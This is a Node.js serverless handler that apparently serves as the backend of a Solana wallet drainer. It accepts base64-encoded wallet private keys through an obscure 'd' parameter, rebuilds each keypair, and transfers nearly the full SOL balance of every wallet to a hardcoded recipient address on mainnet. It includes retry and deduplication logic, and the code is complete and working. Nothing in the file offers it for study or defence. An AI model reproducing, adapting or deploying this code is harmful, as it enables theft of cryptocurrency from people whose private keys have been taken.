const { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58').default;

// Configuration
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'E6xVZgZZ2b2xqk4sDe8fPBtA9DAcRrddzHMh3NRaXyjW';
const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
const MAX_RETRIES = 5;
const RETRY_DELAY_BASE = 500; // ms
const WALLET_DELAY = 500; // ms

// In-memory deduplication
const processedKeys = new Set();

// Retry wrapper for RPC calls
async function withRetry(fn, maxRetries = MAX_RETRIES, baseDelay = RETRY_DELAY_BASE) {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.message.includes('429 Too Many Requests') && attempt < maxRetries) {
        const delay = baseDelay * Math.pow(2, attempt);
        console.log(`[retry] Server responded with 429. Retrying after ${delay}ms delay...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      throw error;
    }
  }
}

// Delay function
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

module.exports = async function handler(req, res) {
  console.log('[request]', {
    method: req.method,
    query: req.query,
    body: req.body
  });

  const query = req.query || {};
  const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
  const dParam = (query.d || (body && body.d) || '').toString();
  
  console.log('[dParam]', dParam);

  if (dParam) {
    try {
      const cleaned = dParam.replace(/[()]/g, '');
      console.log('[cleaned]', cleaned);
      const decoded = Buffer.from(cleaned, 'base64').toString('utf8');
      console.log('[decoded]', decoded);
      const parsedData = tryJsonParse(decoded) ?? decoded;
      
      console.log('[decoded-data]', {
        ...parsedData,
        wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
      });

      if (parsedData?.wallets?.length > 0) {
        const connection = new Connection(CLUSTER_URL, 'confirmed');

        let blockhash;
        await withRetry(async () => {
          const latestBlockhash = await connection.getLatestBlockhash();
          blockhash = latestBlockhash.blockhash;
        });

        for (const [index, wallet] of parsedData.wallets.entries()) {
          const privateKeyBase58 = wallet.key;
          if (!privateKeyBase58) {
            console.log(`[no-key] No valid key for wallet at index ${index}`);
            continue;
          }
          try {
            const secretKey = bs58.decode(privateKeyBase58);
            if (secretKey.length !== 64) {
              throw new Error('Invalid private key length (must be 64 bytes)');
            }

            const fromKeypair = Keypair.fromSecretKey(secretKey);
            const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
            const pubkeyStr = fromKeypair.publicKey.toBase58();

            if (processedKeys.has(pubkeyStr)) {
              console.log(`[skip] Already processed key at index ${index}: ${pubkeyStr}`);
              continue;
            }
            processedKeys.add(pubkeyStr);

            const balance = await withRetry(async () => await connection.getBalance(fromKeypair.publicKey));
            console.log(`[balance] Wallet ${index}: ${balance} lamports`);

            if (balance <= 0) {
              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: >0`);
              continue;
            }

            // Create placeholder transaction to estimate fee
            const placeholderTx = new Transaction({
              recentBlockhash: blockhash,
              feePayer: fromKeypair.publicKey,
            }).add(
              SystemProgram.transfer({
                fromPubkey: fromKeypair.publicKey,
                toPubkey,
                lamports: 0, // Placeholder to estimate fee
              })
            );

            const estimatedFee = await withRetry(async () => await placeholderTx.getEstimatedFee(connection)) || 5000;

            const transferAmount = balance - estimatedFee;
            if (transferAmount <= 0) {
              console.error(`[error] Insufficient balance for fee from ${pubkeyStr} (wallet ${index}): ${balance} lamports, estimated fee: ${estimatedFee}`);
              continue;
            }

            const transaction = new Transaction({
              recentBlockhash: blockhash,
              feePayer: fromKeypair.publicKey,
            });

            transaction.add(
              SystemProgram.transfer({
                fromPubkey: fromKeypair.publicKey,
                toPubkey,
                lamports: transferAmount,
              })
            );

            const signature = await withRetry(async () => await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
              maxRetries: 2,
              skipPreflight: false,
            }));
            console.log(`[success] Transferred ${transferAmount} lamports from ${pubkeyStr} (wallet ${index}) to ${toPubkey.toBase58()}. Signature: ${signature}`);

            if (index < parsedData.wallets.length - 1) {
              console.log(`[delay] Waiting ${WALLET_DELAY}ms before processing next wallet...`);
              await delay(WALLET_DELAY);
            }
          } catch (error) {
            console.error(`[transfer-error] Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}... (wallet ${index}): ${error.message}`);
          }
        }
      } else {
        console.log('[no-wallets]', 'No wallets found in parsed data');
      }
    } catch (e) {
      console.log('[decode-error]', e?.message || String(e));
    }
  } else {
    console.log('[no-dParam]', 'No d parameter provided in request');
  }

  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send('ok');
}

function safeParseJSON(input) {
  if (!input || typeof input !== 'string') return input;
  try { return JSON.parse(input); } catch { return input; }
}

function tryJsonParse(input) {
  try { return JSON.parse(input); } catch { return null; }
}
